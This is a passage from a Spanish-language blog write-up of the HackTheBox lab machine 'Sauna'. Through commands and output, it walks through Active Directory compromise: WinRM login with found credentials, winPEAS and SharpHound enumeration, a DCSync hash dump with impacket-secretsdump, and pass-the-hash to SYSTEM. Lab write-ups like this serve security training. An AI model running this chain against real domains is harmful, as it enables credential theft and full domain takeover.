</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span>
HTTP        10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>egotisticalbank\fsmith
</code></pre></div></div>

<h2 id="ad-enum-local">AD ENUM LOCAL</h2>

<p>Nos encontramos dentro de la máquina víctima, sin embargo, necesitamos escalar privilegios, por lo tanto, debemos enumerar la máquina para obtener más información que nos pueda ayudar.</p>

<h3 id="usuarios-de-la-máquina">USUARIOS DE LA MÁQUINA</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User accounts <span class="k">for</span> <span class="se">\\</span>

<span class="nt">-------------------------------------------------------------------------------</span>
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr

</code></pre></div></div>

<h3 id="grupos-y-privilegios-del-usuario-actual">GRUPOS Y PRIVILEGIOS DEL USUARIO ACTUAL</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<h3 id="información-general-de-un-grupo-local">INFORMACIÓN GENERAL DE UN GRUPO LOCAL</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup <span class="s2">"Remote Management Users"</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols <span class="o">(</span>such as WS-Management via the Windows Remote Management service<span class="o">)</span><span class="nb">.</span> This applies only to WMI namespaces that grant access to the user.

Members

<span class="nt">-------------------------------------------------------------------------------</span>
FSmith
svc_loanmgr
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<h2 id="ad-winpeas-enum">AD WINPEAS ENUM</h2>

<p>Vamos a realizar una enumeración profunda en la máquina y para esto hacemos uso de la herramienta <code class="language-plaintext highlighter-rouge">WINPEAS</code> descargandola en nuestra máquina y transmitiendola a la máquina víctima, permitiendo destacar información adicional que ayuda a la enumeración local, encontrando en este caso una contraseña para el usuario <code class="language-plaintext highlighter-rouge">svc_loanmgr</code></p>

<h4 id="máquina-atacante">MÁQUINA ATACANTE</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/carlospolop/PEASS-ng/releases/download/20220717/winPEASx64.exe
</code></pre></div></div>

<h4 id="máquina-víctima">MÁQUINA VÍCTIMA</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>recon
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>recon
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload ~/Desktop/bast1ant1c/HTB/Sauna/exploit/winPEAS.exe
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\w</span>inPEAS.exe
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking <span class="k">for </span>AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK<span class="se">\s</span>vc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!<span class="sb">```</span>
</code></pre></div></div>

<h2 id="granted-access-svc_deploy-user">GRANTED ACCESS SVC_DEPLOY USER</h2>

<p>Ahora tenemos lo necesario para conectarnos remotamente en caso de tener credenciales validas previamente detectadas por <code class="language-plaintext highlighter-rouge">crackmapexec</code> por medio de la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmgr'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:Moneymakestheworldgoround!
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmgr'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span>
HTTP        10.10.10.175    5985   SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:Moneymakestheworldgoround! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'svc_loanmgr'</span> <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>egotisticalbank<span class="se">\s</span>vc_loanmgr
</code></pre></div></div>

<h2 id="bloodhound-install">BLOODHOUND INSTALL</h2>

<p>Para realizar una enumerción más detallada de permisos, usuarios y grupos del AD, vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">bloodhound</code>, por lo tanto vamos a proceder a instalarla.
Es importante aclarar que si existen novedades con la instalación se recurra al proyecto directamente, esto debido a que se está en constante actualización.</p>

<p>Al momento de ejecutar <code class="language-plaintext highlighter-rouge">neo4j</code> este requiere acceder a un puerto especifico y acceder con claves por defecto, luego de este proceso pedira un cambio de clave, es importante guardar estas credenciales porque las utilizaremos al momento de acceder a <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>neo4j bloodhound
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>update-alternatives <span class="nt">--config</span> java
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># SELECCIONAR JAVA-11</span>
</code></pre></div></div>

<h2 id="bloodhound-enum">BLOODHOUND ENUM</h2>

<p>Ahora vamos a descargar y transmitir el binario <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> a la máquina víctima para extraer la información del AD y posteriormente visualizarla en <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>

<h4 id="máquina-atacante-1">MÁQUINA ATACANTE</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
</code></pre></div></div>

<h4 id="máquina-víctima-1">MÁQUINA VÍCTIMA</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>privs
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>privs
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload ~/Desktop/bast1ant1c/HTB/Sauna/content/SharpHound.ps1
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-module .<span class="se">\S</span>harpHound.ps1
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-BloodHound <span class="nt">-CollectionMethod</span> All
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rivs<span class="se">\2</span>0220718205025_BloodHound.zip bloodhound.zip
</code></pre></div></div>

<h3 id="bloodhound-interaction">BLOODHOUND INTERACTION</h3>

<p>Ya tenemos la información descargada en nuestro equipo, ahora procedemos a revisar la data con <code class="language-plaintext highlighter-rouge">bloodhound</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neo4j console &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># INGRESAR CREDENCIALES DE ACCESO</span>
</code></pre></div></div>

<h4 id="seguir-secuencia-en-bloodhound">SEGUIR SECUENCIA EN BLOODHOUND</h4>
<blockquote>

  <p>Upload Data &gt; bloodhound.zip &gt; Analysis &gt; Find all domain admins
										 &gt; Find shortest paths to domain admins &gt; Domain</p>

</blockquote>

<h4 id="marcar-usuarios-pwned">MARCAR USUARIOS PWNED</h4>
<blockquote>

  <p>Buscar user &gt; mark user as owned</p>

</blockquote>

<h4 id="escalamiento">ESCALAMIENTO</h4>
<blockquote>

  <p>Node info &gt; Outbound control rights &gt; First degree object control</p>

</blockquote>

<p align="center">
<img src="/assets/images/sauna/03-blood.png" />
</p>

<h2 id="dcsync-attack">DCSYNC ATTACK</h2>

<p>Vamos a realizar un <code class="language-plaintext highlighter-rouge">DCSYNK ATTACK</code>, suplantando el AD para capturar los hashes que nos permiten la conexión de los usuarios que logremos dumpear.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="s1">'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:c6c4ff7bc2607cc5bfdd2ea96ef077e7:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL<span class="se">\H</span>Smith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL<span class="se">\F</span>Smith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL<span class="se">\s</span>vc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA<span class="nv">$:</span>aes256-cts-hmac-sha1-96:42e9e4ea4cb6908b7823f948dbf40e2491ade643a678e2944dc43a4d99e826d7
SAUNA<span class="nv">$:</span>aes128-cts-hmac-sha1-96:d3e465ad71dd231a5aea1d15aeb27512
SAUNA<span class="nv">$:</span>des-cbc-md5:5e839d57a1c876e6
</code></pre></div></div>

<h2 id="granting-access-administrator-user-pass-the-hash">GRANTING ACCESS ADMINISTRATOR USER (PASS THE HASH)</h2>

<p>Tenemos el hash del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, ahora vamos a conectarnos con la utilidad <code class="language-plaintext highlighter-rouge">psexec</code>, para entablar una conexión directamente con la máquina víctima.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec <span class="s1">'EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175'</span> cmd.exe <span class="nt">-hashes</span> <span class="s1">':823452073d75b9d1cf70ebdf86c7f98e'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nt authority<span class="se">\s</span>ystem
</code></pre></div></div>

<h2 id="flags">FLAGS</h2>

<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd c:<span class="se">\ </span>       
c:<span class="se">\&gt;</span><span class="nb">dir</span> /b/s user.txt
c:<span class="se">\U</span>sers<span class="se">\F</span>Smith<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
c:<span class="se">\&gt;</span><span class="nb">set</span> /P <span class="nv">user</span><span class="o">=</span>&lt;<span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\F</span><span class="s2">Smith</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
c:<span class="se">\&gt;</span>echo.%user:~0,10%       
d8a7fe7238
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\&gt;</span><span class="nb">dir</span> /b/s root.txt
c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
c:<span class="se">\&gt;</span><span class="nb">set</span> /P <span class="nv">root</span><span class="o">=</span>&lt;<span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span>
c:<span class="se">\&gt;</span>echo.%root:~0,10%
7aba2d34ff
</code></pre></div></div>

<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">sauna</code> de HackTheBox!</p>

<p align="center">
<img src="/assets/images/sauna/04-finish.png" />
</p>

<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>

<p><strong>Nos vemos en otro bit.</strong></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active Directory</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sauna" class="page__taxonomy-item" rel="tag">Sauna</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-15T00:00:00-05:00">February 15, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/timelapse/" class="pagination--pager" title="HTB timelapse AD
">Previous</a>
    
    
      <a href="/forest/" class="pagination--pager" title="HTB forest AD
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
<!--
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
-->
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
